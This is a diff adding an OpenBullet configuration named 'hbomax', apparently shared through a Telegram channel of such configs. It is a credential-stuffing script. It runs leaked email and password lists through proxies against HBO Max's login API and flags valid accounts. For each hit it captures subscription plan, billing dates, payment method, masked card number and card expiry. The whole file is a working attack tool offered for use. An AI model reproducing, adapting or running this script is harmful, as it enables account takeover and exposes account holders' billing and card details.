@@ -1,0 +1,184 @@
+[SETTINGS]
+{
+  "Name": "hbomax",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-12T02:20:08.2225496+08:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@wanted_boy",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var rnd1 = uuidv4();
+var rnd2 = uuidv4();
+var rnd3 = uuidv4();
+END SCRIPT -> VARS "rnd1,rnd2,rnd3"
+
+#Post REQUEST POST "https://comet.api.hbo.com/tokens" 
+  CONTENT "{\"client_id\":\"7161aff6-188a-4718-8d35-69c6ae58884f\",\"client_secret\":\"7161aff6-188a-4718-8d35-69c6ae58884f\",\"scope\":\"browse video_playback_free\",\"grant_type\":\"client_credentials\",\"deviceSerialNumber\":\"<rnd3>\",\"clientDeviceData\":{\"paymentProviderCode\":\"blackmarket\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: oauth.api.hbo.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.35.0.274 desktop (DESKTOP)" 
+  HEADER "X-Hbo-Device-Os-Version: undefined" 
+  HEADER "X-Hbo-Device-Name: desktop" 
+  HEADER "X-B3-Traceid: <rnd1>-<rnd2>" 
+  HEADER "Origin: https://play.hbomax.com" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://play.hbomax.com/" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+IF "<SOURCE>" DoesNotContain "access_token"
+SET STATUS BAN
+ENDIF
+
+#access_token PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token" 
+
+#Login REQUEST POST "https://comet.api.hbo.com/tokens" 
+  CONTENT "{\"grant_type\":\"user_name_password\",\"scope\":\"browse video_playback device elevated_account_management\",\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: oauth-us.api.hbo.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.35.0.274 desktop (DESKTOP)" 
+  HEADER "X-Hbo-Device-Os-Version: undefined" 
+  HEADER "X-Hbo-Device-Name: desktop" 
+  HEADER "Authorization: Bearer <access_token>" 
+  HEADER "X-B3-Traceid: <rnd1>-<rnd2>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The email address or password is incorrect" 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+    KEY "<RESPONSECODE>" EqualTo "501" 
+  KEYCHAIN Success OR 
+    KEY "isUserLoggedIn\":true}" 
+
+#access_token2 PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token2" 
+
+#Post REQUEST POST "https://comet.api.hbo.com/content" 
+  CONTENT "[{\"id\":\"urn:hbo:continue-watching:mine\"}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: comet.api.hbo.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.35.0.274 desktop (DESKTOP)" 
+  HEADER "X-Hbo-Device-Os-Version: undefined" 
+  HEADER "X-Hbo-Device-Name: desktop" 
+  HEADER "Authorization: Bearer <access_token2>" 
+  HEADER "X-B3-Traceid: <rnd1>-<rnd2>" 
+  HEADER "Origin: https://play.hbomax.com" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://play.hbomax.com/" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#ETag PARSE "<SOURCE>" LR "{\"ETag\":\"" "\"," -> VAR "ETag" 
+
+#Post REQUEST POST "https://comet.api.hbo.com/content" 
+  CONTENT "[{\"id\":\"urn:hbo:billing-status:mine\",\"headers\":{\"If-None-Match\":\"<ETag>\"}}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: comet.api.hbo.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.35.0.274 desktop (DESKTOP)" 
+  HEADER "X-Hbo-Device-Os-Version: undefined" 
+  HEADER "X-Hbo-Device-Name: desktop" 
+  HEADER "Authorization: Bearer <access_token2>" 
+  HEADER "X-B3-Traceid: <rnd1>-<rnd2>" 
+  HEADER "Origin: https://play.hbomax.com" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://play.hbomax.com/" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#Information PARSE "<SOURCE>" LR "billingInformationMessage" "" -> VAR "Information" 
+
+IF "<Information>" Contains "You’re not subscribed to HBO Max"
+SET STATUS CUSTOM "FREE"
+ENDIF
+IF "<Information>" Contains "expired"
+SET STATUS CUSTOM "EXPIRED"
+ENDIF
+
+#Plan PARSE "<SOURCE>" LR "Current Plan: [" "]" CreateEmpty=FALSE -> CAP "Plan" 
+
+#autoRenewToggleable PARSE "<SOURCE>" JSON "autoRenewToggleable" CreateEmpty=FALSE -> CAP "autoRenewToggleable" 
+
+#autoRenew PARSE "<SOURCE>" JSON "autoRenew" CreateEmpty=FALSE -> CAP "autoRenew" 
+
+#Billed_Through PARSE "<SOURCE>" LR "Billed Through: [" "]" CreateEmpty=FALSE -> CAP "Billed Through" 
+
+#Price PARSE "<SOURCE>" LR "Price: [" "]" CreateEmpty=FALSE -> CAP "Price" 
+
+#nextBilling PARSE "<SOURCE>" LR "Next Billing Date: [" "T" CreateEmpty=FALSE -> CAP "nextBilling" 
+
+#Unix FUNCTION DateToUnixTime "yyyy-MM-dd" "<nextBilling>" -> VAR "Unix" 
+
+#Current FUNCTION CurrentUnixTime -> VAR "Current" 
+
+#Compute FUNCTION Compute "(<Unix>-<Current>)/86400" -> VAR "Compute" 
+
+#daysLeft FUNCTION Round "<Compute>" -> CAP "daysLeft" 
+
+#paymentMethod PARSE "<SOURCE>" LR "Payment Method: [" "]" CreateEmpty=FALSE -> CAP "paymentMethod" 
+
+#cardExpire PARSE "<SOURCE>" LR "](strong) ending in [" "]" CreateEmpty=FALSE -> CAP "cardExpire" 
+
+IF "<SOURCE>" Contains "paymentMethodMessage"
+
+#paymentMethodMessage PARSE "<SOURCE>" JSON "paymentMethodMessage" -> VAR "paymentMethodMessage" 
+
+#paymentMethod PARSE "<paymentMethodMessage>" LR "Your subscription is billed to your [" "]" CreateEmpty=FALSE -> CAP "paymentMethod" 
+
+#Card PARSE "<paymentMethodMessage>" LR "ending in [" "]" CreateEmpty=FALSE -> CAP "Card" "************" "" 
+
+#cardExpire PARSE "<paymentMethodMessage>" LR "expires on " "." CreateEmpty=FALSE -> CAP "cardExpire" 
+
+ENDIF
+SET CAP "Author Telegram" "@wanted_boy"
+SET CAP "Telegram Channel" "https://t.me/OpenBullet_CFGs"
+
